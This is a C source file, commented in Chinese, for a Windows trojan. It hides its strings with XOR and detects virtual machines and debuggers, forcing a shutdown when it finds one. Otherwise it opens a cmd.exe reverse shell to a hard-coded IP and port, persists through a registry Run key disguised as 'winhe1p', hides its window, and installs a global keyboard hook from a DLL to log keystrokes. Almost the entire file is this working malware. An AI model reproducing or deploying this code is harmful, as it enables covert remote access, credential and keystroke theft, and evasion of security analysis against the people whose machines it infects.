#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <windows.h>
#include <stdio.h> 
#include <tchar.h>
#include <Psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <shlwapi.h>
#pragma   comment(lib,"shlwapi.lib")
#include <tlhelp32.h>

/*
如果修改如下信息，需要重新编译：
    远程IP及端口
    记录文件路径
    dll文件名
*/

HANDLE hDesProcess = NULL;
const unsigned long SE_SHUTDOWN_PRIVILEGE = 0x13;
typedef int(_stdcall *_RtlAdjustPrivilege)(int, BOOL, BOOL, int *);
typedef int(_stdcall *_ZwShutdownSystem)(int);

#define SALT 1
const char * xor_key = "4@!32^*125";
int len_key = strlen(xor_key);
/* bool AdjustProcessTokenPrivilege() {
    LUID luidTmp;
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("AdjustProcessTokenPrivilege OpenProcessToken Failed ! \n");
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidTmp)) {
        printf("AdjustProcessTokenPrivilege LookupPrivilegeValue Failed ! \n");
        CloseHandle(hToken);
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luidTmp;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        printf("AdjustProcessTokenPrivilege AdjustTokenPrivileges Failed ! \n");
        CloseHandle(hToken);
        return FALSE;
    }
    return true;
} */

char* encrypt(char *text) {
    char *result;
    int length = strlen(text);
    result = (char*)malloc(sizeof(char) * (length + 1));
    if(sizeof(text) != sizeof(result)){
        return NULL;
    }
    int i;
    for (i = 0; i < length; i++){
        result[i] = text[i] ^ xor_key[i % len_key] + SALT;
    }
    result[length] = 0;
    return result;
}

void shutdownimm(){
    // char Filename[256];
    // char Parameters[256];

    //我 删 我 自 己
    /* GetModuleFileNameA(0, Filename, 256);
    GetShortPathNameA(Filename, Filename, 256);
    strcpy(Parameters, "/c del ");
    strcat(Parameters, Filename);
    strcat(Parameters, " >> NUL");
    printf("del?\n");
    ShellExecuteA(0, 0, "cmd.exe", Parameters, 0, 0); */

    system("pause");
    //提权
    char ntdll[] = {123, 21, 102, 120, 127, 113, 79, 94, 95, 0};
    HMODULE hNtDll = LoadLibrary(encrypt(ntdll));
    if (!hNtDll){
        char err[] = {83, 32, 75, 88, 19, 43, 68, 18, 95, 89, 84, 37, 2, 122, 103, 27, 103, 126, 29, 82, 89, 45, 126, 90, 0};
        printf(encrypt(err));
        exit(1);
    }
    char func_rap[] = {103, 53, 78, 117, 87, 53, 94, 65, 71, 102, 71, 40, 84, 93, 95, 58, 76, 87, 0};
    _RtlAdjustPrivilege pfnRtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(hNtDll, encrypt(func_rap));
    int nEn;
    pfnRtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &nEn);
    //强制关机
    char func_zss[] = {111, 54, 113, 92, 70, 43, 79, 93, 68, 88, 102, 56, 81, 64, 86, 50, 0};
    _ZwShutdownSystem pfnZwShutdownSystem = (_ZwShutdownSystem)GetProcAddress(hNtDll, encrypt(func_zss));
    pfnZwShutdownSystem(2);
    exit(-1);
}

DWORD FindProcess(LPCTSTR ProcessName){
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD dwThreadId = 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    BOOL fOk;
    for (fOk = Process32First(hSnapshot, &pe); fOk; fOk = Process32Next(hSnapshot, &pe)){
        if (!_tcscmp(pe.szExeFile, ProcessName)){
            // printf("Succeed: Get Thread ID: %ld\n",pe.th32ProcessID);
            dwThreadId = pe.th32ProcessID;
        }
    
    }
    CloseHandle(hSnapshot);
    // if (dwThreadId = 0)
    //     printf("Error: Thread ID not found.\n");
    return dwThreadId;
}

bool DetectVM(){
    bool is_VM = false;
    //查看当前运行的进程
    char vm_exe1[] = {67, 44, 86, 91, 92, 51, 88, 86, 29, 83, 77, 36, 0};
    char vm_exe2[] = {67, 44, 67, 87, 71, 55, 71, 66, 29, 83, 77, 36, 0};
    if(FindProcess(encrypt(vm_exe1)) || FindProcess(encrypt(vm_exe2))){
        char err[] = {115, 40, 76, 80, 19, 9, 102, 18, 67, 68, 90, 34, 71, 71, 64, 3, 69, 0};
        printf(encrypt(err));
        is_VM |= true;
    }

    //查看vmtool程序路径
    char vm_path[] = {118, 123, 126, 104, 99, 45, 68, 85, 65, 87, 88, 97, 100, 93, 95, 58, 88, 110, 111, 96, 120, 54, 67, 70, 86, 3, 119, 100, 126, 65, 84, 51, 71, 20, 103, 48, 68, 94, 64, 106, 105, 0};
    if(PathIsDirectory(encrypt(vm_path))){
        char err[] = {115, 40, 76, 80, 19, 9, 102, 70, 92, 89, 89, 97, 68, 91, 95, 59, 78, 64, 111, 88, 0};
        printf(encrypt(err));
        is_VM |= true;
    }

    //in
    ULONG VM_ver = 0;
    __try{
        __asm{
            push   edx
            push   ecx
            push   ebx 
            mov    eax, 'VMXh'
            mov    ebx, 0   //用于存放VMware所有响应的内存地址
            mov    ecx, 0xa //获取VMware版本，若为0x14则get the memory size
            mov    edx, 'VX'//为in指令指定VMware I/O通信端口
            in     eax, dx  //从源操作数指定的端口复制数据到目的操作数指定的内存地址
            cmp    ebx, 'VMXh' 
            setz   [is_VM] 
            mov    [VM_ver], ecx  //存储VMware版本, 1=Express, 2=ESX, 3=GSX, 4=WorkStation
            pop    ebx
            pop    ecx
            pop    edx
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER){//若不在虚拟机中运行in指令会触发异常
        is_VM |= false;
    }
    if(is_VM){
        char err[] = {124, 110, 109, 20, 68, 48, 89, 89, 64, 106, 91, 0};
        printf(encrypt(err));
        is_VM |= true;
    }

    return is_VM;

    // No Pill
/*     ULONG xdt = 0 ;
    ULONG InVM = 0;
    __asm{
        push edx
        sidt [esp-2]
        pop edx
        nop
        mov xdt , edx
    }
    if (xdt > 0xd0000000){
        InVM = 1;
    }
    else{
        InVM = 0;
    }
    __asm{
        push edx
        sgdt [esp-2]
        pop edx
        nop
        mov xdt , edx
    }
    if(xdt > 0xd0000000){
        InVM += 1;
    }
    if(InVM == 0){
        return FALSE;
    }
    else{
        printf("No Pills work\n");
        return TRUE;
    } */

    // str
    /* unsigned char mem[4] = {0};
    __asm str mem;
    printf("%s\n", mem);
    if ((mem[0] == 0x00) && (mem[1] == 0x40)){
        printf("str works\n");
        return TRUE;
    }
    else{
        return FALSE;
    } */
}

bool DetectDebug(){
    bool is_Debug = 0;
    //Win API
    if(IsDebuggerPresent()){
        char err[] = {124, 50, 102, 81, 81, 42, 76, 85, 86, 68, 101, 51, 71, 71, 86, 49, 95, 110, 93, 0};
        printf(encrypt(err));
        is_Debug |= true;
    }
    
    //PEB
    __asm{
        mov eax, fs:[30h]
        mov al, BYTE PTR [eax + 2] 
        mov is_Debug, al
    }
    if(is_Debug){
        char err[] = {101, 4, 96, 20, 113, 58, 66, 92, 84, 114, 80, 35, 87, 83, 84, 58, 79, 18, 64, 83, 65, 29, 76, 0};
        printf(encrypt(err));
        is_Debug |= true;
    }

    // int 3
    /* __asm{
        push offset continue
        push DWORD ptr fs:[0]
        mov  fs:[0], esp
        int  3
        mov  eax, 0xffffffff
        push lpszProcessName
        call printf
        jmp  eax
    continue:
        //mov  [is_Debug], 0

    } */

    __try{
        __asm int 3
    }
    __except(1){
        return is_Debug | false;
    }
    is_Debug |= true;


    return is_Debug;
}

int addreg(){
    char Filepath[256];
    char Syspath[256];
    HKEY hkey = NULL;
    DWORD ret;
    GetModuleFileNameA(0, Filepath, 256);


    char reg_path[] = {102, 14, 100, 96, 100, 30, 121, 119, 111, 106, 120, 40, 65, 70, 92, 44, 68, 84, 71, 106, 105, 22, 75, 90, 87, 48, 92, 65, 111, 106, 118, 52, 80, 70, 86, 49, 95, 100, 86, 68, 70, 40, 77, 90, 111, 3, 121, 71, 93, 0};
    ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //创建一个注册表项，如果有则打开该注册表项
                        encrypt(reg_path),
                        0,
                        NULL,
                        REG_OPTION_NON_VOLATILE,
                        KEY_ALL_ACCESS,    //部分windows系统编译该行会报错， 删掉 “”KEY_WOW64_64KEY | “” 即可
                        NULL,
                        &hkey,
                        NULL);
    if (ret != ERROR_SUCCESS) {
        char err[] = {90, 49, 71, 90, 19, 45, 78, 85, 19, 80, 84, 40, 78, 104, 93, 0};
        printf(encrypt(err));
        return 0;
    }

    ret = RegSetValueEx(hkey,
                        "winhe1p",
                        0,
                        REG_SZ,
                        (const BYTE *)Filepath,
                        strlen(Filepath));
    if (ret != ERROR_SUCCESS) {
        char err[] = {70, 36, 86, 20, 65, 58, 76, 18, 85, 87, 92, 45, 71, 80, 111, 49, 0};
        printf(encrypt(err));
        return 0;
    }

    RegCloseKey(hkey);

    return 1;
}

void remotecontrol(){
    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in sin;
    char ip_addr[16] = "192.168.166.128";
    char port[6] = "6666";

    STARTUPINFO start_info;

    PROCESS_INFORMATION process_info;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host;
    host = gethostbyname(ip_addr);
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(port));
    sin.sin_addr.s_addr = inet_addr(ip_addr);

    if(WSAConnect(Winsock, (SOCKADDR*)&sin, sizeof(sin), NULL, NULL, NULL, NULL)){
        printf("connect failed\n");
        exit(-1);
    }

    //设置stdout、stderr和stdin的句柄到socket
    memset(&start_info, 0, sizeof(start_info));
    start_info.cb = sizeof(start_info);
    start_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    start_info.hStdInput = start_info.hStdOutput = start_info.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");
    //由于cmd作为CreateProcessA的参数调用，因此通过绑定一个套接字与命令shell来创建逆向shell
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &start_info, &process_info);
}

int main(int argc, char *argv[]){
    // printf("Start\n");
    //虚拟机检测
    if(DetectVM() == true){
        char err[] = {71, 52, 76, 90, 90, 49, 76, 18, 90, 88, 21, 23, 111, 24, 19, 58, 83, 91, 71, 95, 91, 38, 126, 90, 0};
        printf(encrypt(err));
        shutdownimm();
    }

    //调试过程检测
    if(DetectDebug() == true){
        char err[] = {71, 52, 76, 90, 90, 49, 76, 18, 70, 88, 81, 36, 80, 20, 87, 58, 73, 71, 84, 22, 88, 46, 70, 81, 111, 49, 0};
        printf(encrypt(err));
        shutdownimm();
    }
    
    //远程控制
    remotecontrol();

    //添加注册表达到开机自启动
    addreg();

    //隐藏cmd窗口
    ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);

    //读取DLL及其中的函数
    char dll[] = {94, 36, 91, 70, 86, 60, 79, 94, 95, 24, 81, 45, 78, 0};
    HMODULE hMod = LoadLibraryA(encrypt(dll));
    if(!hMod){
        // printf("Load DLL fail");
        return 1;
    }
    
    char dllfunc[] = {10, 12, 91, 124, 92, 48, 64, 114, 115, 111, 114, 11, 106, 125, 121, 31, 113, 0};
    DWORD lpFunc = (DWORD)GetProcAddress(hMod, encrypt(dllfunc));
    if(!lpFunc){
        if(hMod) 
            FreeLibrary(hMod);
        // printf("Error: Load DLL function FAIL!\n");
        return 1;
    }
    
    

    HHOOK hhook = SetWindowsHookEx(
    WH_KEYBOARD,//WH_KEYBOARD,//WH_CALLWNDPROC,
    (HOOKPROC)lpFunc,
    hMod,
    0);//此处输入线程标识符，若为0则捕获全局键盘消息
    
    if(hhook == 0){
        // printf("Hook Fail\n");
        return 1;
    }

    MSG msg;
    while(1){
        if (PeekMessageA(&msg, 0, 0, 0, PM_REMOVE)){
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        else
            Sleep(0);
    }
    
    return 0;
}

